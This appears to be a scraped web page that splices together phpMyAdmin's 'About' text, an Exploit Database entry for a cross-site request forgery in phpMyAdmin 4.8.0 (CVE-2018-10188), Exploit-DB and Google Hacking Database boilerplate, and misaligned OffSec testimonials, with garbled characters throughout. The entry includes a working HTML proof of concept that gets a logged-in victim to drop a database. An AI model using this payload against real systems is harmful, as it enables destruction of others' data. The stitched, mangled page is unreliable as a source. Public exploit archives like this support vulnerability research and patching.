## About

phpMyAdmin is a free software tool written in [PHP](https://php.net/),
intended to handle the administration of [MySQL](https://www.mysql.com/)
over the Web. phpMyAdmin supports a wide range of operations on MySQL and
MariaDB. Frequently used operations (managing databases, tables,
columns, relations, indexes, users, permissions, etc) can be performed via the
user interface, while you still have the ability to directly execute any SQL statement.

[![phpMyAdmin book](/static/images/books/pma_en_3.4_150x185.png)
![phpMyAdmin Starter](/static/images/books/pma_starter_150x184.jpg)](/docs/#books)

phpMyAdmin comes with a wide range of [documentation](/docs/) and users are welcome to
update [our wiki pages](https://github.com/phpmyadmin/phpmyadmin/wiki) to share ideas and
howtos for various operations. The [phpMyAdmin team](/team/) will try to help you if
you face any problem; you can use a [variety of support channels](/support/) to get
help.

phpMyAdmin is also very deeply documented in a book written by one of the developers
â [Mastering phpMyAdmin for
Effective MySQL Management](https://www.packtpub.com/big-data-and-business-intelligence/mastering-phpmyadmin-34-effective-mysql-management), which is available in English and [Spanish](/docs/#books).

To ease usage to a wide range of people, phpMyAdmin is being translated into [72 languages](/translations/) and supports both LTR
and RTL languages.

phpMyAdmin is a mature project with a stable and flexible code
base; you can find out more about the [project and its history](/about/) and the [awards](/awards/) it earned. When the project turned 15, we published a [celebration page](/15-years/).

The phpMyAdmin project is a member of [Software Freedom Conservancy](https://sfconservancy.org). SFC is a not-for-profit organization that helps promote, improve, develop, and defend Free, Libre, and Open Source Software (FLOSS) projects.

```
# Exploit Title: phpMyAdmin 4.8.0 < 4.8.0-1 - Cross-Site Request Forgery
# Date: 2018-04-20
# Software Link: https://www.phpmyadmin.net/
# Author: @revengsh & @0x00FI
# CVE: CVE-2018-10188
# Category: Webapps

#1. Description
#The vulnerability exists due to failure in the "/sql.php" script to properly verify the source of HTTP request.
#This Cross-Site Request Forgery (CSRF) allows an attacker to execute arbitrary SQL statement by sending a malicious request to a logged in user.
#2. Proof of Concept: This example sends HTTP GET crafted request in order to drop the specified database.

<html>
  <body>
    <a href="http://[HOST]/phpmyadmin/sql.php?sql_query=DROP+DATABASE+[DBNAME]">
      Drop database
    </a>
  </body>
</html>

#3. Solution: Upgrade to phpMyAdmin 4.8.0-1 or newer.
#4. Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10188

##### About The Exploit Database

Ã

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as âGoogle Hackingâ was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnnyâs talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term âGoogledorkâ to refer
to âa foolish or inept person as revealed by Googleâ. This was meant to draw attention to
the fact that this was not a âGoogle problemâ but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term âdorkâ became shorthand for a search query that located sensitive
information and âdorksâ were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

### Duane LaFlotte

CTO, Pulsar Security

  I feel like every person's first experience in cybersecurity should be OffSec. Before you go out to figure out how to create a zero-day and you get confused, if you start with OffSec, that won't happen due to how methodologically all the training is put together.      ![Emile Kok](/_astro/emile.C3f2EqfQ.png)

Founder and Managing Director, TSTC Institute

  When going to the real world, you have to know what you're doing and understand what is expected from you on the job. For us, OffSec is the champion in this league in educating and preparing learners.      ![Douglas Costa](/_astro/douglas.BdxOPM2d.png)
